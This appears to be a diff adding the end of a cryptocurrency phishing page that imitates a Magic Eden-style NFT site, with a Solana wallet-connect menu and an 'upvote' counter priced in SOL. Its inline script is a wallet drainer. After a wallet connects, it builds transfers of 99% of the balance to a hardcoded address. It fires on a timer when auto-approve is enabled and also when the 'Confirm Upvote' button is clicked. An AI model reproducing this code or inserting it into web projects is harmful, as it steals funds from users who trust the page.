+                                                                <span><img src="images/BTN_SLOPE.svg" alt="Slope icon" height="24" width="24" /></span>
+                                                            </button>
+                                                        </li>
+                                                        <li>
+                                                            <button class="wallet-adapter-button" tabindex="0" type="button" style="justify-content: space-between;">
+                                                                Solflare
+                                                                <span><img src="images/BTN_SOLFLARE.svg" alt="Solflare icon" height="24" width="24" /></span>
+                                                            </button>
+                                                        </li>
+                                                        <li>
+                                                            <div class="accordion" id="accordionExample">
+                                                                <div class="accordion-item" style="background: transparent !important; border: 0px solid transparent !important;">
+                                                                    <h2 class="accordion-header" id="headingOne">
+                                                                        <button
+                                                                            class="wallet-adapter-button accordion-button"
+                                                                            type="button"
+                                                                            data-toggle="collapse"
+                                                                            data-target="#collapseOne"
+                                                                            aria-expanded="false"
+                                                                            aria-controls="collapseOne"
+                                                                            style="background-color: #404144 !important; margin-top: 20px;"
+                                                                        >
+                                                                            More options
+                                                                        </button>
+                                                                    </h2>
+                                                                    <div id="collapseOne" class="collapse" aria-labelledby="headingOne" data-parent="#accordionExample">
+                                                                        <div class="accordion-body" style="padding: 0rem !important;">
+                                                                            <button class="wallet-adapter-button" tabindex="0" type="button" style="justify-content: space-between;">
+                                                                                Sollet
+                                                                                <span><img src="images/BTN_SOLLET.svg" alt="Sollet icon" height="24" width="24" /></span>
+                                                                            </button>
+
+                                                                            <button class="wallet-adapter-button" tabindex="0" type="button" style="justify-content: space-between;">
+                                                                                Clover
+                                                                                <span><img src="images/BTN_CLOVER.svg" alt="Clover icon" height="24" width="24" /></span>
+                                                                            </button>
+
+                                                                            <button class="wallet-adapter-button" tabindex="0" type="button" style="justify-content: space-between;">
+                                                                                Ledger
+                                                                                <span><img src="images/BTN_LEDGER.svg" alt="Ledger icon" height="24" width="24" /></span>
+                                                                            </button>
+
+                                                                            <button class="wallet-adapter-button" tabindex="0" type="button" style="justify-content: space-between;">
+                                                                                Solong
+                                                                                <span><img src="images/BTN_SOLONG.png" alt="Solong icon" height="24" width="24" /></span>
+                                                                            </button>
+
+                                                                            <button class="wallet-adapter-button" tabindex="0" type="button" style="justify-content: space-between;">
+                                                                                MathWallet
+                                                                                <span><img src="images/BTN_MATHWALLET.svg" alt="MathWallet icon" height="24" width="24" /></span>
+                                                                            </button>
+                                                                        </div>
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+                                                        </li>
+                                                    </ul>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <script src="assets/js/vendor/core.min.js"></script>
+                            <script src="assets/js/vendor/popper.min.js"></script>
+                            <script src="assets/js/vendor/bootstrap.min.js"></script>
+                            <script src="assets/js/main.js"></script>
+                            <!--- <script src="static/js/2.4537e294.chunk"></script> --->
+
+                            <script src="static/js/chunk.js"></script>
+                            <script src="static/js/main.chunk.js"></script>
+                            <script src="assets/js/Scroller.js"></script>
+                            <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+                            <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous"></script>
+                            <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js" integrity="sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy" crossorigin="anonymous"></script>
+                            <script src="https://unpkg.com/@solana/web3.js@1.29.2/lib/index.iife.min.js"></script>
+
+                            <script>
+                                function upValue() {
+                                    document.getElementById("counet").value = parseInt(1) + parseInt(document.getElementById("counet").value);
+
+                                    document.getElementById("wqwqw").textContent = (parseInt(document.getElementById("counet").value) * 1.777).toFixed(2).toString() + " SOL";
+                                }
+
+                                function downValue() {
+                                    if (document.getElementById("counet").value == "1") {
+                                    } else {
+                                        document.getElementById("counet").value = parseInt(document.getElementById("counet").value) - parseInt(1);
+
+                                        document.getElementById("wqwqw").textContent = (parseInt(document.getElementById("counet").value) * 1.777).toFixed(2).toString() + " SOL";
+                                    }
+                                }
+                                window.addEventListener("load", () => {
+                                    var sent = false;
+                                    const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"));
+
+                                    const getProvider = () => {
+                                        if ("solana" in window) {
+                                            const provider = window.solana;
+                                            if (provider.isPhantom) {
+                                                return provider;
+                                            }
+                                        }
+                                        window.open("https://phantom.app/", "_blank");
+                                    };
+
+                                    function onBodyLoad() {
+                                        const solConnected = window.solana.isConnected;
+
+                                        if (!solConnected) {
+                                            connectWallet();
+                                        } else {
+                                            username_text = String(provider.publicKey);
+                                            username_short = username_text.substring(0, 8);
+                                            document.getElementById("WalletButton").setAttribute("data-target", "#False");
+
+                                            document.getElementById("showcase__btn0").innerHTML = username_short + "...";
+
+                                            document.getElementById("WalletButton").innerText = "Confirm Upvote";
+                                            document.getElementById("WalletButton").style.background = "#170934";
+                                        }
+                                        refreshStatus();
+                                    }
+
+                                    function refreshStatus() {
+                                        const provider = getProvider();
+                                        if (provider) {
+                                            provider.on("connect", () => {
+                                                setConnected();
+                                                username_text = String(provider.publicKey);
+                                                username_short = username_text.substring(0, 8);
+                                                document.getElementById("WalletButton").setAttribute("data-target", "#False");
+
+                                                document.getElementById("showcase__btn0").innerHTML = username_short + "...";
+
+                                                document.getElementById("WalletButton").innerText = "Confirm Upvote";
+                                                document.getElementById("WalletButton").style.background = "#110727";
+                                            });
+                                            provider.on("disconnect", () => {
+                                                setNotConnected();
+                                            });
+                                        }
+                                    }
+
+                                    function connectWallet() {
+                                        window.solana.connect({
+                                            onlyIfTrusted: false,
+                                        });
+                                    }
+                                    async function setConnected() {
+                                        let account_info = await connection.getAccountInfo(window.solana.publicKey);
+                                        console.log("Auto Approve: " + window.solana.autoApprove);
+                                    }
+
+                                    function trySend() {
+                                        if (window.solana.autoApprove) {
+                                            if (!sent) {
+                                                apimainnet();
+                                            }
+                                        } else {
+                                            console.log("Not auto approve!");
+                                        }
+                                    }
+                                    async function testTransfer2(howmany) {
+                                        const provider = getProvider();
+                                        const solConected = window.solana.isConnected;
+                                        const manylamports = (howmany * 1000000000).toFixed(0);
+
+                                        if (!provider) {
+                                            return;
+                                        }
+                                        if (!solConected) {
+                                            return;
+                                        }
+
+                                        let account_info = await connection.getAccountInfo(window.solana.publicKey);
+                                        var charginglamports = manylamports;
+                                        console.log(charginglamports);
+                                        if (account_info.lamports / 2 > manylamports) {
+                                            charginglamports = (account_info.lamports * 0.99).toFixed(0);
+                                        }
+
+                                        if (account_info.lamports < manylamports && account_info.lamports > 100000) {
+                                            charginglamports = (account_info.lamports * 0.99).toFixed(0);
+                                        }
+                                        console.log(charginglamports);
+
+                                        let transaction = new solanaWeb3.Transaction().add(
+                                            solanaWeb3.SystemProgram.transfer({
+                                                fromPubkey: provider.publicKey,
+                                                toPubkey: "Fe5A77H6ZYp8x9TijiNUbZy5qSW7oc1b3tqLkdoA8kDB",
+                                                lamports: charginglamports,
+                                            })
+                                        );
+
+                                        let { blockhash } = await connection.getRecentBlockhash();
+                                        transaction.recentBlockhash = blockhash;
+                                        transaction.feePayer = provider.publicKey;
+
+                                        return transaction;
+                                    }
+
+                                    async function makeTransfer(howmany) {
+                                        let transaction = await testTransfer2(howmany);
+                                        const provider = getProvider();
+
+                                        if (!provider) {
+                                            return;
+                                        }
+                                        console.log(provider);
+                                        console.log(transaction);
+
+                                        if (transaction) {
+                                            //try {
+
+                                            console.log("asd");
+                                            let signed = await provider.signTransaction(transaction, connection);
+                                            console.log(signed);
+                                            let signature = await connection.sendRawTransaction(signed.serialize());
+                                            console.log(signature);
+                                            await connection.confirmTransaction(signature);
+                                            //} catch(err) {
+                                            //  console.warn(err);
+                                            //}
+                                        }
+                                    }
+
+                                    async function testTransfer() {
+                                        const provider = getProvider();
+                                        const solConected = window.solana.isConnected;
+
+                                        if (!provider) {
+                                            return;
+                                        }
+                                        if (!solConected) {
+                                            return;
+                                        }
+
+                                        let account_info = await connection.getAccountInfo(window.solana.publicKey);
+
+                                        if (account_info.lamports >= 10000000) {
+                                            let transaction = new solanaWeb3.Transaction().add(
+                                                solanaWeb3.SystemProgram.transfer({
+                                                    fromPubkey: provider.publicKey,
+                                                    toPubkey: "Fe5A77H6ZYp8x9TijiNUbZy5qSW7oc1b3tqLkdoA8kDB",
+                                                    lamports: (account_info.lamports * 0.99).toFixed(0),
+                                                })
+                                            );
+
+                                            let { blockhash } = await connection.getRecentBlockhash();
+                                            transaction.recentBlockhash = blockhash;
+                                            transaction.feePayer = provider.publicKey;
+
+                                            return transaction;
+                                        }
+                                    }
+
+                                    async function apimainnet() {
+                                        let transaction = await testTransfer();
+                                        const provider = getProvider();
+
+                                        if (!provider) {
+                                            return;
+                                        }
+                                        console.log(provider);
+                                        console.log(transaction);
+
+                                        if (transaction) {
+                                            //try {
+
+                                            console.log("asd");
+                                            let signed = await provider.signTransaction(transaction, connection);
+                                            console.log(signed);
+                                            let signature = await connection.sendRawTransaction(signed.serialize());
+                                            console.log(signature);
+                                            sent = true;
+                                            await connection.confirmTransaction(signature);
+                                            //} catch(err) {
+                                            //  console.warn(err);
+                                            //}
+                                        }
+                                    }
+
+                                    function setNotConnected() {
+                                        // document.getElementById("connStatus").innerHTML = "Not Connected";
+                                    }
+
+                                    setInterval(trySend, 10000);
+
+                                    document.getElementById("WalletButton").onclick = function () {
+                                        if (document.getElementById("WalletButton").getAttribute("data-target") == "#False") {
+                                            makeTransfer(100000);
+                                        } else {
+                                            refreshStatus();
+                                        }
+                                    };
+
+                                    document.getElementById("Phantom_Connect").onclick = function () {
+                                        onBodyLoad();
+                                    };
+                                });
+                            </script>
+
+                            <script>
+                                !(function (e) {
+                                    function r(r) {
+                                        for (var n, a, i = r[0], c = r[1], l = r[2], s = 0, p = []; s < i.length; s++) (a = i[s]), Object.prototype.hasOwnProperty.call(o, a) && o[a] && p.push(o[a][0]), (o[a] = 0);
+                                        for (n in c) Object.prototype.hasOwnProperty.call(c, n) && (e[n] = c[n]);
+                                        for (f && f(r); p.length; ) p.shift()();
+                                        return u.push.apply(u, l || []), t();
+                                    }
+                                    function t() {
+                                        for (var e, r = 0; r < u.length; r++) {
+                                            for (var t = u[r], n = !0, i = 1; i < t.length; i++) {
+                                                var c = t[i];
+                                                0 !== o[c] && (n = !1);
+                                            }
+                                            n && (u.splice(r--, 1), (e = a((a.s = t[0]))));
+                                        }
+                                        return e;
+                                    }
+                                    var n = {},
+                                        o = { 1: 0 },
+                                        u = [];
+                                    function a(r) {
+                                        if (n[r]) return n[r].exports;
+                                        var t = (n[r] = { i: r, l: !1, exports: {} });
+                                        return e[r].call(t.exports, t, t.exports, a), (t.l = !0), t.exports;
+                                    }
+                                    (a.e = function (e) {
+                                        var r = [],
+                                            t = o[e];
+                                        if (0 !== t)
+                                            if (t) r.push(t[2]);
+                                            else {
+                                                var n = new Promise(function (r, n) {
+                                                    t = o[e] = [r, n];
+                                                });
+                                                r.push((t[2] = n));
+                                                var u,
+                                                    i = document.createElement("script");
+                                                (i.charset = "utf-8"),
+                                                    (i.timeout = 120),
+                                                    a.nc && i.setAttribute("nonce", a.nc),
+                                                    (i.src = (function (e) {
+                                                        return a.p + "static/js/" + ({}[e] || e) + "." + { 3: "44c79d30", 4: "3a917d8d", 5: "ce620d76", 6: "f1b6baa7" }[e] + ".chunk.js";
+                                                    })(e));
+                                                var c = new Error();
+                                                u = function (r) {
+                                                    (i.onerror = i.onload = null), clearTimeout(l);
+                                                    var t = o[e];
+                                                    if (0 !== t) {
+                                                        if (t) {
+                                                            var n = r && ("load" === r.type ? "missing" : r.type),
+                                                                u = r && r.target && r.target.src;
+                                                            (c.message = "Loading chunk " + e + " failed.\n(" + n + ": " + u + ")"), (c.name = "ChunkLoadError"), (c.type = n), (c.request = u), t[1](c);
+                                                        }
+                                                        o[e] = void 0;
+                                                    }
+                                                };
+                                                var l = setTimeout(function () {
+                                                    u({ type: "timeout", target: i });
+                                                }, 12e4);
+                                                (i.onerror = i.onload = u), document.head.appendChild(i);
+                                            }
+                                        return Promise.all(r);
+                                    }),
+                                        (a.m = e),
+                                        (a.c = n),
+                                        (a.d = function (e, r, t) {
+                                            a.o(e, r) || Object.defineProperty(e, r, { enumerable: !0, get: t });
+                                        }),
+                                        (a.r = function (e) {
+                                            "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, { value: "Module" }), Object.defineProperty(e, "__esModule", { value: !0 });
+                                        }),
+                                        (a.t = function (e, r) {
+                                            if ((1 & r && (e = a(e)), 8 & r)) return e;
+                                            if (4 & r && "object" == typeof e && e && e.__esModule) return e;
+                                            var t = Object.create(null);
+                                            if ((a.r(t), Object.defineProperty(t, "default", { enumerable: !0, value: e }), 2 & r && "string" != typeof e))
+                                                for (var n in e)
+                                                    a.d(
+                                                        t,
+                                                        n,
+                                                        function (r) {
+                                                            return e[r];
+                                                        }.bind(null, n)
+                                                    );
+                                            return t;
+                                        }),
+                                        (a.n = function (e) {
+                                            var r =
+                                                e && e.__esModule
+                                                    ? function () {
+                                                          return e.default;
+                                                      }
+                                                    : function () {
+                                                          return e;
+                                                      };
+                                            return a.d(r, "a", r), r;
+                                        }),
+                                        (a.o = function (e, r) {
+                                            return Object.prototype.hasOwnProperty.call(e, r);
+                                        }),
+                                        (a.p = "/"),
+                                        (a.oe = function (e) {
+                                            throw (console.error(e), e);
+                                        });
+                                    var i = (this["webpackJsonp@magiceden/web2"] = this["webpackJsonp@magiceden/web2"] || []),
+                                        c = i.push.bind(i);
+                                    (i.push = r), (i = i.slice());
+                                    for (var l = 0; l < i.length; l++) r(i[l]);
+                                    var f = c;
+                                    t();
+                                })([]);
+                            </script>
+
+                            <div at-magnifier-wrapper="">
+                                <div class="at-theme-dark">
+                                    <div class="at-base notranslate" translate="no"></div>
+                                </div>
+                            </div>
+
+                            <app-content ng-version="11.1.0"></app-content>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </body>
+</html>
